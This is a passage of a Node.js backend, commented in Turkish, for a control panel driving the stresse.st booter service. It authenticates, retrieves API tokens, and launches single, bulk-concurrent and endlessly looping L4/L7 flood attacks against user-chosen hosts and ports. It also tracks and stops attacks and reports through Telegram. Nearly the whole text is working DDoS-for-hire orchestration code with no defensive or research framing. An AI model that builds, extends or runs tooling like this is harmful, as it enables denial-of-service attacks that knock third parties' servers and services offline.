          break;
        } catch (retryErr) {
          console.warn(`[login] GET /vcookie deneme ${attempt}/3 hata: ${retryErr.message}`);
          if (attempt === 3) throw retryErr;
          await new Promise((r) => setTimeout(r, 1000));
        }
      }
      if (!vcookieRes.data || !vcookieRes.data.username) {
        return res.status(401).json({ status: 'error', message: 'Invalid credentials' });
      }

      // 4. Fetch user plan for backend-side limit enforcement
      step = 'GET /plan';
      let planData = {};
      try {
        const planRes = await client.get(`/plan/${vcookieRes.data.username}`);
        planData = planRes.data || {};
      } catch (planErr) {
        console.warn(`[login] Plan alinamadi: ${planErr.message}`);
      }

      // 5. Fetch API token for direct API usage
      step = 'GET /getApiToken';
      let apiToken = null;
      try {
        const tokenRes = await client.get('/getApiToken');
        apiToken = tokenRes.data?.apitoken || tokenRes.data?.token || tokenRes.data?.apiToken || null;
        if (apiToken) {
          console.log(`[login] API token alindi: ${apiToken.slice(0, 8)}...`);
        } else {
          console.warn('[login] /getApiToken bos dondu, fallback token kullanilacak');
        }
      } catch (tokenErr) {
        console.warn(`[login] API token alinamadi: ${tokenErr.message}`);
      }
      if (!apiToken) {
        apiToken = getFallbackApiToken();
        if (apiToken) {
          console.log(`[login] Fallback API token kullaniliyor: ${apiToken.slice(0, 8)}...`);
        }
      }

      sessions[sessionId].username = vcookieRes.data.username || username;
      sessions[sessionId].user = vcookieRes.data;
      sessions[sessionId].plan = planData;
      sessions[sessionId].apiToken = apiToken;
      // Basarili loginde guncel key'i fallback dosyasina da yaz; ileride
      // token'suz login'lerde ve yenileme senaryolarinda guncel kalsin.
      if (apiToken) {
        try {
          fs.writeFileSync(API_TOKEN_FILE, apiToken);
        } catch (writeErr) {
          console.warn('[login] Fallback token dosyasi yazilamadi:', writeErr.message);
        }
      }
      saveState();

      res.json({
        status: 'success',
        sessionId,
        user: vcookieRes.data,
        plan: planData
      });
    } catch (stepErr) {
      // Basarisiz login durumunda olusturulan gecici session'i temizle
      delete sessions[sessionId];
      saveState();

      // Hangi adimda patladigini ve stresse.st'in dondugu govdeyi acikca gorelim
      const status = stepErr.response?.status;
      const body = stepErr.response?.data;
      console.error(`Login error @ ${step}: ${stepErr.message}`);
      console.error(`  upstream status: ${status}`);
      console.error(`  upstream body:`, typeof body === 'string' ? body.slice(0, 500) : JSON.stringify(body)?.slice(0, 500));
      return res.status(502).json({
        status: 'error',
        message: `stresse.st ${step} -> ${status || 'no-response'}: ${stepErr.message}`,
        upstreamStatus: status,
        upstreamBody: typeof body === 'string' ? body.slice(0, 300) : body
      });
    }
  } catch (error) {
    console.error('Login error:', error.message);
    res.status(500).json({ status: 'error', message: error.message });
  }
});

/**
 * GET /api/stresse/user/:username
 */
app.get('/api/stresse/user/:username', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const client = getClient(sessionId);
    const response = await client.get(`/user/${req.params.username}`);
    res.json(response.data);
  } catch (error) {
    handleEndpointError(res, error, 'User fetch error');
  }
});

/**
 * GET /api/stresse/plan/:username
 */
app.get('/api/stresse/plan/:username', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const { username } = req.params;
    const client = getClient(sessionId);
    try {
      const response = await fetchWithRetry(() => client.get(`/plan/${username}`), `plan/${username}`);
      planCache.set(username, { data: response.data, fetchedAt: Date.now() });
      return res.json(response.data);
    } catch (err) {
      // Upstream iki denemede de basarisiz: cache varsa (taze veya bayat) onu dondur.
      const cached = planCache.get(username);
      if (cached) {
        const stale = Date.now() - cached.fetchedAt > PLAN_CACHE_TTL_MS;
        console.warn(`[cache] plan bayat veri servis edildi (username=${username}, yas=${Math.round((Date.now() - cached.fetchedAt) / 1000)}sn, ttlAsimi=${stale})`);
        return res.json(cached.data);
      }
      throw err;
    }
  } catch (error) {
    handleEndpointError(res, error, 'Plan fetch error');
  }
});

/**
 * GET /api/stresse/methods
 */
app.get('/api/stresse/methods', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const client = getClient(sessionId);
    try {
      const response = await fetchWithRetry(() => client.get('/methods.json'), 'methods');
      methodsCache.data = response.data;
      methodsCache.fetchedAt = Date.now();
      return res.json(response.data);
    } catch (err) {
      // Upstream iki denemede de basarisiz: cache varsa (taze veya bayat) onu dondur.
      if (methodsCache.data) {
        const stale = Date.now() - methodsCache.fetchedAt > METHODS_CACHE_TTL_MS;
        console.warn(`[cache] methods bayat veri servis edildi (yas=${Math.round((Date.now() - methodsCache.fetchedAt) / 1000)}sn, ttlAsimi=${stale})`);
        return res.json(methodsCache.data);
      }
      throw err;
    }
  } catch (error) {
    handleEndpointError(res, error, 'Methods fetch error');
  }
});

/**
 * GET /api/stresse/ongoing/:username
 *
 * stresse.st'ten gelen gercek ongoing listesine, backend restart sonrasi
 * hatirladigimiz attack ID'lerini de ekler. Boylece normal saldirilar da
 * restart sonrasi panelde gorunmeye devam eder.
 */
app.get('/api/stresse/ongoing/:username', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const { username } = req.params;
    const client = getClient(sessionId);
    const response = await client.get(`/ongoing/${username}`);

    let ongoing = [];
    if (Array.isArray(response.data)) {
      ongoing = response.data;
    } else if (response.data && Array.isArray(response.data.attacks)) {
      ongoing = response.data.attacks;
    }

    const existingIds = new Set(ongoing.map((a) => a.attack_id || a.id));
    const now = Date.now();

    // stresse.st'te hala gecerli olan saldirilarin local expiresAt degerini uzat.
    // Boylece cleanup erken silmez ve liste azalip artmaz.
    ongoing.forEach((item) => {
      const id = item.attack_id || item.id;
      const localAttack = activeAttacks[id];
      if (localAttack) {
        const remaining = parseInt(item.timeLeft || item.time || localAttack.time) || 60;
        const newExpires = new Date(now + remaining * 1000).toISOString();
        if (newExpires > (localAttack.expiresAt || '')) {
          localAttack.expiresAt = newExpires;
        }
      }
    });

    Object.values(activeAttacks).forEach((attack) => {
      // Sadece ayni session'a ait saldirilari ekle (diger kullanicilarin saldirilarini karistirma)
      if (attack.sessionId !== sessionId) return;
      // Sadece ayni kullaniciya ait saldirilari ekle
      if (attack.username && attack.username !== username) return;
      // Zaten listede varsa tekrar ekleme
      if (existingIds.has(attack.attackId)) return;

      const expires = new Date(attack.expiresAt || 0).getTime();
      const timeLeft = Math.max(0, Math.round((expires - now) / 1000));
      if (timeLeft <= 0) return; // Suresi dolmussa ekleme

      ongoing.push({
        attack_id: attack.attackId,
        id: attack.attackId,
        target: buildTargetUrl(attack.host, attack.port),
        host: attack.host,
        port: attack.port,
        method: attack.method,
        layer: attack.layer || 'L4',
        timeLeft,
        // Frontend'in diger alanlarini doldur
        time: attack.time,
        startedAt: attack.startedAt,
        expiresAt: attack.expiresAt,
        // stresse.st'den gelen gercek deger degil, "persisted" isareti
        persisted: true
      });
    });

    res.json(ongoing);
  } catch (error) {
    handleEndpointError(res, error, 'Ongoing fetch error');
  }
});

/**
 * POST /api/stresse/attack
 */
app.post('/api/stresse/attack', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const { port, time, method, subnet = '32', geo = 'worldwide', layer = 'L4' } = req.body;
    const rawHost = req.body.host;
    if (layer === 'L4' && /https?:\/\/|\//.test(rawHost || '')) {
      return res.status(400).json({ status: 'error', message: 'L4 hedefinde URL protokolu veya / kullanilamaz' });
    }
    const host = normalizeHost(rawHost);
    if (!host || !port || !time || !method) {
      return res.status(400).json({ status: 'error', message: 'host, port, time and method required' });
    }

    if (isFreeMethod(method)) {
      return res.status(403).json({ status: 'error', message: 'FREE methodlar bu panelde kullanilamaz' });
    }

    const minTime = getMinTime(method, layer);
    if (parseInt(time) < minTime) {
      return res.status(400).json({ status: 'error', message: `Minimum sure ${minTime} saniye (${method})` });
    }

    const planCheck = checkPlanLimits(sessionId, time, 1);
    if (!planCheck.ok) {
      return res.status(403).json({ status: 'error', message: planCheck.message });
    }

    const session = sessions[sessionId];
    if (!session || !session.apiToken) {
      return res.status(401).json({ status: 'error', message: 'API token not available, please login again' });
    }

    let data, attackIds;
    try {
      const result = await launchAttacksGet(sessionId, {
        host, port: parseInt(port), time: parseInt(time), method, layer, geo, subnet
      }, 1);
      data = result.data;
      attackIds = result.attackIds;
    } catch (err) {
      return res.status(502).json({ status: 'error', message: err.message });
    }

    if (attackIds.length > 0) {
      attackIds.forEach((attackId) => {
        registerAttack(attackId, sessionId, { host, port: parseInt(port), method, time, layer });
      });
      addAttackHistory(sessionId, { host, port, method, time, layer }, {
        concurrents: 1,
        attackIds
      });
    } else if (data?.status === 'success') {
      // stresse.st success dondu ama ID cikaramadik; saldiri kayitsiz kalir.
      console.warn(`[attack] stresse.st success dondu ama attackId bulunamadi: host=${host} method=${method}`);
    }

    res.json({
      status: attackIds.length > 0 ? 'success' : 'error',
      // Upstream'in sebebini (orn. method bakimda) kullanici gorebilsin
      message: attackIds.length > 0 ? undefined : (data?.message || 'Saldiri upstream tarafindan baslatilamadi'),
      data,
      attackIds,
      id: attackIds[0] || null,
      attack_id: attackIds[0] || null
    });
  } catch (error) {
    handleEndpointError(res, error, 'Attack error');
  }
});

/**
 * POST /api/stresse/attack/bulk
 * Body: { host, port, time, method, subnet, geo, concurrents, layer }
 *
 * API key ile tek istekte concurrents kadar saldiri baslatir.
 */
app.post('/api/stresse/attack/bulk', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const { port, time, method, subnet = '32', geo = 'worldwide', layer = 'L4', concurrents = 1 } = req.body;
    const rawHost = req.body.host;
    if (layer === 'L4' && /https?:\/\/|\//.test(rawHost || '')) {
      return res.status(400).json({ status: 'error', message: 'L4 hedefinde URL protokolu veya / kullanilamaz' });
    }
    const host = normalizeHost(rawHost);
    if (!host || !port || !time || !method) {
      return res.status(400).json({ status: 'error', message: 'host, port, time and method required' });
    }

    if (isFreeMethod(method)) {
      return res.status(403).json({ status: 'error', message: 'FREE methodlar bu panelde kullanilamaz' });
    }

    const minTime = getMinTime(method, layer);
    if (parseInt(time) < minTime) {
      return res.status(400).json({ status: 'error', message: `Minimum sure ${minTime} saniye (${method})` });
    }

    const count = Math.max(1, parseInt(concurrents) || 1);

    const planCheck = checkPlanLimits(sessionId, time, count);
    if (!planCheck.ok) {
      return res.status(403).json({ status: 'error', message: planCheck.message });
    }

    const session = sessions[sessionId];
    if (!session || !session.apiToken) {
      return res.status(401).json({ status: 'error', message: 'API token not available, please login again' });
    }

    // Tek istekte istenen concurrents kadar saldiri baslat.
    let data, attackIds;
    try {
      const result = await launchAttacksGet(sessionId, {
        host, port: parseInt(port), time: parseInt(time), method, layer, geo, subnet
      }, count);
      data = result.data;
      attackIds = result.attackIds;
    } catch (err) {
      return res.status(502).json({ status: 'error', message: err.message });
    }

    attackIds.forEach((attackId) => {
      registerAttack(attackId, sessionId, { host, port: parseInt(port), method, time, layer });
    });

    const successCount = attackIds.length;

    if (attackIds.length > 0) {
      addAttackHistory(sessionId, { host, port, method, time, layer }, {
        concurrents: count,
        attackIds
      });
    }

    res.json({
      status: successCount > 0 ? 'success' : 'error',
      total: count,
      successCount,
      failCount: count - successCount,
      // ID dogrulanamadiysa kullanici gercek durumu gorsun; "basarili" denip
      // baslatilmamis saldiri gosterilmesin.
      message: successCount > 0
        ? (data?.message || '')
        : (data?.status === 'success'
            ? 'stresse.st basarili dondu ancak saldiri dogrulanamadi (method bakimda veya upstream reddi olabilir)'
            : (data?.message || 'Saldiri baslatilamadi')),
      data,
      id: attackIds[0] || null,
      attack_id: attackIds[0] || null,
      attackIds
    });
  } catch (error) {
    handleEndpointError(res, error, 'Bulk attack error');
  }
});

/**
 * POST /api/stresse/test-api
 * Body: { host, port, time, method, layer, concurrents, geo }
 *
 * stresse.st API'sine dogrudan bir istek atip ham yaniti doner.
 * Sistem calismadiginda debug icin kullanilir.
 */
app.post('/api/stresse/test-api', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const session = sessions[sessionId];
    if (!session || !session.apiToken) {
      return res.status(401).json({ status: 'error', message: 'API token not available, please login again' });
    }

    const { port, time, method, geo = 'worldwide', layer = 'L4', concurrents = 1, apiToken: bodyToken } = req.body;
    const rawHost = req.body.host;
    const host = normalizeHost(rawHost);
    if (!host || !port || !time || !method) {
      return res.status(400).json({ status: 'error', message: 'host, port, time and method required' });
    }

    const apiToken = (typeof bodyToken === 'string' && bodyToken.trim()) ? bodyToken.trim() : session.apiToken;
    const apiClient = getApiClient(sessionId);
    const url = buildApiUrl(apiToken, {
      host,
      port: parseInt(port),
      time: parseInt(time),
      method,
      geo,
      layer,
      concurrents: parseInt(concurrents)
    });

    let upstreamRes = null;
    let upstreamErr = null;
    try {
      upstreamRes = await apiClient.get(url, { timeout: 15000 });
    } catch (err) {
      upstreamErr = err;
    }

    res.json({
      status: 'debug',
      requestedUrl: url,
      tokenSource: (typeof bodyToken === 'string' && bodyToken.trim()) ? 'body' : 'session',
      tokenPrefix: apiToken.slice(0, 8),
      upstreamStatus: upstreamRes?.status,
      upstreamData: upstreamRes?.data,
      upstreamError: upstreamErr ? {
        message: upstreamErr.message,
        status: upstreamErr.response?.status,
        data: upstreamErr.response?.data
      } : null
    });
  } catch (error) {
    handleEndpointError(res, error, 'Test API error');
  }
});

/**
 * Verilen loopId icin loop motorunu calistirir.
 * startLoop ve loadState() tarafindan kullanilir.
 */
const MAX_LOOP_CONSECUTIVE_ERRORS = 10;

async function runLoop(loopId) {
  const loop = activeLoops[loopId];
  if (!loop || !loop.sessionId) {
    console.error(`[loop ${loopId}] Baslatilamadi: loop veya sessionId bulunamadi`);
    delete activeLoops[loopId];
    saveState();
    return;
  }

  // Loop'u global kuyruga ekle; scheduler sirasi geldiginde calistiracak.
  if (!loopQueue.includes(loopId)) {
    loopQueue.push(loopId);
    console.log(`[loop ${loopId}] kuyruga eklendi. Sira: ${loopQueue.length}`);
  }
  processLoopQueue().catch((err) => console.error('[scheduler] processLoopQueue beklenmeyen hata:', err));
}

async function processLoopQueue() {
  if (isProcessingLoopQueue) return;
  isProcessingLoopQueue = true;

  while (loopQueue.length > 0) {
    const loopId = loopQueue.shift();
    const loop = activeLoops[loopId];
    if (!loop || !loop.running) continue;

    // Ayni loopId'den ayni anda sadece 1 tur calissin; aktif turu varsa bekle.
    if (activeLoopRounds.has(loopId)) {
      if (!loopQueue.includes(loopId)) {
        loopQueue.push(loopId);
      }
      await new Promise(r => setTimeout(r, 500));
      continue;
    }

    activeLoopRounds.add(loopId);
    console.log(`[scheduler] ${loopId} turu baslatiliyor`);
    runLoopRound(loopId).finally(async () => {
      activeLoopRounds.delete(loopId);
      // Tur bittikten sonra loop hala calisiyorsa kendi intervali kadar bekle,
      // sonra kuyrugun sonuna ekle.
      if (activeLoops[loopId]?.running) {
        const delayMs = Math.max(0, parseInt(loop.params?.interval) || 0) * 1000;
        if (delayMs > 0) {
          console.log(`[scheduler] ${loopId} sonraki tur icin ${delayMs}ms bekleniyor`);
          await new Promise(r => setTimeout(r, delayMs));
        }
        if (!loopQueue.includes(loopId)) {
          loopQueue.push(loopId);
          console.log(`[loop ${loopId}] tur tamamlandi, kuyruga geri eklendi`);
        }
      } else {
        cleanupLoop(loopId);
      }
      // Scheduler'i tekrar calistir
      processLoopQueue().catch((err) => console.error('[scheduler] processLoopQueue beklenmeyen hata:', err));
    }).catch((err) => console.error('[scheduler] runLoopRound beklenmeyen hata:', err));
  }

  isProcessingLoopQueue = false;
}

// sinceMs verilirse sadece bu zamandan sonra baslamis saldirilar doner
// (timeout kurtarmasinda baska isteklerin saldirilarini kurtarmamak icin).
async function fetchOngoingAttackIds(sessionId, params, limit = 1, sinceMs = null) {
  try {
    const session = sessions[sessionId];
    if (!session?.username) return [];
    const webClient = getClient(sessionId);
    const ongoingRes = await webClient.get(`/ongoing/${session.username}`, { timeout: 15000 });
    const ongoingList = Array.isArray(ongoingRes.data)
      ? ongoingRes.data
      : (ongoingRes.data?.attacks || []);
    const now = Date.now();
    const matching = ongoingList.filter((a) => {
      const method = String(a.method || '').toLowerCase();
      const expectedMethod = String(params.method || '').toLowerCase();
      if (method !== expectedMethod) return false;
      // L4 hedef target icinde IP:port olarak gelir; portu ayirarak host karsilastir.
      let target = String(a.target || a.host || '');
      target = target.replace(/^https?:\/\//i, '');
      if (target.endsWith('/')) target = target.slice(0, -1);
      const hostPart = target.split(':')[0];
      if (hostPart !== params.host) return false;
      const startedAt = new Date(a.startedAt || a.start_time || a.started_at || now).getTime();
      if (sinceMs && startedAt < sinceMs) return false;
      return now - startedAt < 2 * 60 * 1000;
    });
    matching.sort((a, b) =>
      new Date(b.startedAt || b.start_time || b.started_at || 0).getTime() -
      new Date(a.startedAt || a.start_time || a.started_at || 0).getTime()
    );
    const ids = matching.slice(0, limit).map((a) => a.attack_id || a.id).filter(Boolean);
    console.log(`[fetchOngoingAttackIds] ${params.method}@${params.host} => ${ids.length} ID (toplam ${ongoingList.length})`);
    return ids;
  } catch (err) {
    console.warn('[fetchOngoingAttackIds] hata:', err.message);
    return [];
  }
}

async function runLoopRound(loopId) {
  const loop = activeLoops[loopId];
  if (!loop || !loop.running) return;

  const session = sessions[loop.sessionId];
  if (!session || !session.apiToken) {
    console.error(`[loop ${loopId}] API token bulunamadi, loop durduruluyor`);
    loop.stopReason = 'error';
    loop.running = false;
    saveState();
    return;
  }

  console.log(`[loop ${loopId}] round baslatiliyor:`, JSON.stringify({
    host: loop.params.host,
    port: loop.params.port,
    method: loop.params.method,
    time: loop.params.time,
    layer: loop.params.layer,
    concurrents: loop.params.concurrents,
    hasSession: !!session
  }));

  // Onceki turun saldirilari kendi time suresi doldugunda stresse.st tarafindan
  // otomatik sonlanir. Yeni tur baslatmadan once onceki turun attack ID'lerinin
  // stresse.st /ongoing listesinden dustugunu dogrulariz. Boylece 80 concurrent
  // limitini asmayiz.
  const previousRoundIds = loop.roundAttackIds || [];
  if (previousRoundIds.length > 0) {
    const webClient = getClient(loop.sessionId);
    const username = session.username;
    const maxWaitMs = 60 * 1000;
    const checkIntervalMs = 2000;
    const startedWaiting = Date.now();
    let stillActive = new Set(previousRoundIds);

    while (stillActive.size > 0 && Date.now() - startedWaiting < maxWaitMs) {
      try {
        const ongoingRes = await webClient.get(`/ongoing/${username}`);
        const ongoingList = Array.isArray(ongoingRes.data)
          ? ongoingRes.data
          : (ongoingRes.data?.attacks || []);
        const ongoingIds = new Set(ongoingList.map((a) => a.attack_id || a.id));
        stillActive = new Set([...previousRoundIds].filter((id) => ongoingIds.has(id)));
        if (stillActive.size > 0) {
          console.log(`[loop ${loopId}] ${stillActive.size} onceki saldiri hala aktif, bekleniyor...`);
          await new Promise((r) => setTimeout(r, checkIntervalMs));
        }
      } catch (err) {
        console.warn(`[loop ${loopId}] /ongoing kontrolu hatasi:`, err.message);
        await new Promise((r) => setTimeout(r, checkIntervalMs));
      }
    }

    if (stillActive.size > 0) {
      console.warn(`[loop ${loopId}] ${stillActive.size} onceki saldiri ${maxWaitMs}ms icinde sonlanmadi, yine de devam ediliyor`);
    } else {
      console.log(`[loop ${loopId}] Onceki tur saldirilari sonlandi, yeni tur baslatiliyor`);
    }

    previousRoundIds.forEach((attackId) => unregisterAttack(attackId));
  }

  loop.roundCount += 1;
  loop.lastRoundAt = new Date().toISOString();
  const round = loop.roundCount;

  // Yeni tur ID'lerini temizle
  loop.roundAttackIds = [];

  let roundSuccesses = 0;
  let roundError = null;

  // Tek istekte istenen concurrents kadar saldiri baslat.
  // Gelen attack_id'lerden sadece onceki /ongoing'de olmayan yeni ID'leri kaydet.
  try {
    const { data, attackIds, elapsedSec } = await launchAttacksGet(loop.sessionId, loop.params, loop.params.concurrents, loopId);
    if (attackIds.length > 0) {
      roundSuccesses = attackIds.length;
      loop.roundAttackIds = attackIds;
      attackIds.forEach((attackId) => {
        registerAttack(attackId, loop.sessionId, loop.params, loopId, 1, elapsedSec || 0);
      });
      console.log(`[loop ${loopId}] round ${round} basarili: ${attackIds.length} saldiri (istenen: ${loop.params.concurrents})`);
      if (attackIds.length !== loop.params.concurrents) {
        console.warn(`[loop ${loopId}] round ${round} UYARI: stresse.st ${loop.params.concurrents} yerine ${attackIds.length} attackId dondurdu`);
      }
    } else if (data?.status === 'success' || data?.message === 'Attack started') {
      roundSuccesses = loop.params.concurrents;
      loop.roundAttackIds = [];
      console.log(`[loop ${loopId}] round ${round} basarili: ${roundSuccesses} saldiri baslatildi (ID bulunamadi, /ongoing'den gorunecek)`);
    } else {
      roundError = new Error(`GET /api basarisiz: ${data?.message || 'attackId bulunamadi'}`);
      console.error(`[loop ${loopId}] round ${round} hata:`, roundError.message);
    }
  } catch (err) {
    roundError = err;
    console.error(`[loop ${loopId}] round ${round} hata:`, err.message);
  }

  if (roundSuccesses === 0) {
    loop.errors += 1;
    loop.consecutiveErrors = (loop.consecutiveErrors || 0) + 1;
    // Upstream'in gercek mesajini yakala (axios hatasinda response.data'da durur)
    const upstreamMsg = roundError?.response?.data?.message || roundError?.message || 'Bilinmeyen hata';
    loop.lastError = upstreamMsg;
    console.error(`[loop ${loopId}] round ${round} tamamen basarisiz (${loop.consecutiveErrors}/${MAX_LOOP_CONSECUTIVE_ERRORS}): ${upstreamMsg}`);
    // Method bakimda gibi kalici hatalarda 10 tur beklemek anlamsiz; hemen durdur.
    if (/under maintenance/i.test(upstreamMsg)) {
      console.error(`[loop ${loopId}] Kalici upstream hatasi (method bakimda), loop durduruluyor`);
      loop.stopReason = 'error';
      loop.running = false;
    } else if (loop.consecutiveErrors >= MAX_LOOP_CONSECUTIVE_ERRORS) {
      console.error(`[loop ${loopId}] Cok fazla hata, loop otomatik durduruluyor`);
      loop.stopReason = 'error';
      loop.running = false;
    }
  } else {
    loop.consecutiveErrors = 0;
    loop.lastError = null;
    // Basarili tur sonrasi loop history'sinin expiresAt'ini uzat; yoksa cleanup
    // uzun suren loop'larda kaydi erken "completed" isaretleyebilir.
    if (loop.historyId && attackHistory[loop.historyId]) {
      attackHistory[loop.historyId].expiresAt = new Date(Date.now() + loop.params.time * 1000).toISOString();
    }
  }

  // Saldiri stresse.st uzerinde time saniye surer; loop'un siradaki turu
  // icin saldiri bitene kadar bekle. Kullanici durdurursa erken cik.
  const waitUntil = Date.now() + (loop.params.time * 1000);
  while (loop.running && Date.now() < waitUntil) {
    await new Promise(r => setTimeout(r, 1000));
  }

  // Sonsuz loop degilse bu tek turdu, loop'u durdur
  if (!loop.params.infinite) {
    loop.running = false;
  }

  saveState();
}

function cleanupLoop(loopId) {
  const finishedLoop = activeLoops[loopId];
  if (finishedLoop?.historyId && attackHistory[finishedLoop.historyId]) {
    if (attackHistory[finishedLoop.historyId].status === 'active') {
      updateAttackHistoryStatus(finishedLoop.historyId, 'completed');
    }
  }
  // Bu loop'a ait pending/active attack kayitlarini temizle
  let removed = 0;
  Object.keys(activeAttacks).forEach((attackId) => {
    if (activeAttacks[attackId].loopId === loopId) {
      delete activeAttacks[attackId];
      removed++;
    }
  });
  delete activeLoops[loopId];
  saveState();
  console.log(`[loop ${loopId}] temizlendi (${removed} pending kayit silindi)`);
  // Loop dogal olarak bitti (round'lar tamamlandi) veya hata nedeniyle durdu;
  // Telegram bildirimini buna gore gonder.
  notifyLoopRemoved(finishedLoop, finishedLoop?.stopReason === 'error' ? 'durduruldu' : 'tamamlandi');
  checkSlotsEmpty();
}

/**
 * POST /api/stresse/loop
 * Body: { loopId, host, port, time, method, subnet, geo, concurrents, interval, infinite }
 *
 * Non-blocking: loop'u baslatir ve hemen loopId doner. Loop arka planda calisir.
 */
app.post('/api/stresse/loop', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const { port, time, method, subnet = '32', geo = 'worldwide', concurrents = 1, interval = 5, infinite = false, layer = 'L4' } = req.body;
    const rawHost = req.body.host;
    const host = normalizeHost(rawHost);
    if (!host || !port || !time || !method) {
      return res.status(400).json({ status: 'error', message: 'host, port, time and method required' });
    }
    // Loop ID'yi normalize edilmis host uzerinden backend uretir; frontend'in URL protokolu iceren
    // loop ID'leri gecersiz olur. Frontend response'taki loopId'yi kullanir.
    const loopId = `${host}:${port}_${method}_${Date.now()}`;
    console.log(`[loop/create] ${host}:${port} ${method} layer=${layer} time=${time} concurrents=${concurrents} interval=${interval}`);

    if (isFreeMethod(method)) {
      return res.status(403).json({ status: 'error', message: 'FREE methodlar bu panelde kullanilamaz' });
    }

    const minTime = getMinTime(method, layer);
    if (parseInt(time) < minTime) {
      return res.status(400).json({ status: 'error', message: `Minimum süre ${minTime} saniye (${method})` });
    }

    const planCheck = checkPlanLimits(sessionId, time, concurrents);
    if (!planCheck.ok) {
      return res.status(403).json({ status: 'error', message: planCheck.message });
    }

    // Loop saldirisini history'ye sadece bir kez kaydet
    const historyId = addAttackHistory(sessionId, { host, port, method, time, layer }, {
      loop: true,
      concurrents: parseInt(concurrents),
      historyId: `hist_loop_${loopId}`
    });

    activeLoops[loopId] = {
      running: true,
      sessionId,
      historyId,
      schemaVersion: 1,
      params: { host, port: parseInt(port), time: parseInt(time), method: method.toLowerCase(), subnet, geo, concurrents: parseInt(concurrents), interval: parseInt(interval), infinite, layer },
      displayTarget: layer === 'L7' ? host : `${host}:${port}`,
      startedAt: new Date().toISOString(),
      lastRoundAt: null,
      roundCount: 0,
      errors: 0,
      roundAttackIds: []
    };

    // Loop'u arka planda calistir, response hemen donsun
    runLoop(loopId).catch((err) => console.error(`[loop ${loopId}] runLoop beklenmeyen hata:`, err));

    res.json({ status: 'success', loopId, message: 'Loop baslatildi' });
    saveState();
  } catch (error) {
    handleEndpointError(res, error, 'Loop error');
  }
});

/**
 * POST /api/stresse/stop
 * Body: { id }
 */
app.post('/api/stresse/stop', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const { id } = req.body;
    if (!id) return res.status(400).json({ status: 'error', message: 'id required' });

    // Durdurulan saldiri hangi loop'a ait tespit et ve round listesinden cikar.
    let affectedLoopKey = null;
    Object.keys(activeLoops).forEach((key) => {
      const loop = activeLoops[key];
      if (loop?.roundAttackIds?.includes(id)) {
        affectedLoopKey = key;
        loop.roundAttackIds = loop.roundAttackIds.filter((attackId) => attackId !== id);
        console.log(`[stop] Loop roundundan attack ${id} cikarildi: ${key}`);
      }
    });
    saveState();

    const session = sessions[sessionId];
    if (!session || !session.apiToken) {
      return res.status(401).json({ status: 'error', message: 'API token not available, please login again' });
    }

    const apiClient = getApiClient(sessionId);
    const response = await stopAttackApi(apiClient, session.apiToken, id);

    // Durdurulan saldiriyi kayittan sil
    const attackRecord = activeAttacks[id];
    const loopIdOfAttack = attackRecord?.loopId || affectedLoopKey;
    unregisterAttack(id);

    // Loop'a ait saldiri manuel durdurulduysa loop'u da durdur; aksi halde
    // loop sonraki turda ayni hedefi yeniden baslatir ve satir panele geri gelir.
    if (loopIdOfAttack && activeLoops[loopIdOfAttack]?.running) {
      const stoppedLoop = activeLoops[loopIdOfAttack];
      stoppedLoop.running = false;
      delete activeLoops[loopIdOfAttack];
      saveState();
      console.log(`[stop] Loop'a ait saldiri durduruldugu icin loop da durduruldu: ${loopIdOfAttack}`);
      notifyLoopRemoved(stoppedLoop, 'durduruldu');
    }

    // History durumunu guncelle
    const history = findActiveHistoryByAttackId(id);
    if (history && !history.loop) {
      // Sadece normal saldirilarin history'si durduruldu olarak isaretlenir.
      updateAttackHistoryStatus(history.historyId, 'stopped');
    }

    // Eger durdurulan saldiri bir loop'a aitse ve o loop artik aktif degilse,
    // loop history'sini durduruldu olarak isaretle (kullanici loop modundan cikarilmis
    // loop'un saldirilarini tek tek durduruyor demektir).
    if (loopIdOfAttack && !activeLoops[loopIdOfAttack]) {
      const loopHistoryId = `hist_loop_${loopIdOfAttack}`;
      if (attackHistory[loopHistoryId] && attackHistory[loopHistoryId].status === 'active') {
        updateAttackHistoryStatus(loopHistoryId, 'stopped');
      }
    }

    res.json(response);
  } catch (error) {
    handleEndpointError(res, error, 'Stop error');
  }
});

/**
 * POST /api/stresse/stop/bulk
 * Body: { ids: [id1, id2, ...], batchSize?: number, delayMs?: number, concurrency?: number }
 *
 * API key ile ID'leri kucuk gruplara ayirir; her grup icindeki istekleri
 * sinirli concurrency ile paralel atar. Bu sayede cok sayida
 * saldiriyi hizli ve rate limit riskini azaltarak durdurur.
 */
app.post('/api/stresse/stop/bulk', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const { ids, batchSize = 10, delayMs = 500, concurrency = 5 } = req.body;
    if (!Array.isArray(ids) || ids.length === 0) {
      return res.status(400).json({ status: 'error', message: 'ids array required' });
    }

    const session = sessions[sessionId];
    if (!session || !session.apiToken) {
      return res.status(401).json({ status: 'error', message: 'API token not available, please login again' });
    }

    const size = Math.max(1, Math.min(parseInt(batchSize) || 10, 20));
    const delay = Math.max(0, Math.min(parseInt(delayMs) || 500, 5000));
    const concurrent = Math.max(1, Math.min(parseInt(concurrency) || 5, 10));

    const apiClient = getApiClient(sessionId);
    const results = [];
